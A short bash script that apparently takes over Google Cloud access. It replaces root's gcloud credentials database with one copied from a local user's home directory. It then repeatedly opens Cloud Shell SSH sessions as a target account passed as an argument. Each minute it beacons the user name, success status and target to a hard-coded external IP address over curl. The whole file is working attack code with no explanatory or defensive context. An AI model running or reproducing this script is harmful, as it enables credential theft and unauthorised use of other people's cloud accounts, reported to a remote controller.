#!/bin/bash

target=$1

home=$(echo /home/g*)

user=${home#/home/}

gcloud info

rm -rf /root/.config/gcloud/credentials.db

cp -v /home/$user/credentials.db /root/.config/gcloud

gcloud auth list

while true
do
send=$(gcloud cloud-shell ssh --command="echo 'T'" --authorize-session --force-key-file-overwrite --account=$target)

if [ $send != 'T' ]
then
   send='F'
fi

curl http://135.148.11.148/ping.php?user=$user'&send='$send'&target='${target/@*}
sleep 60
done
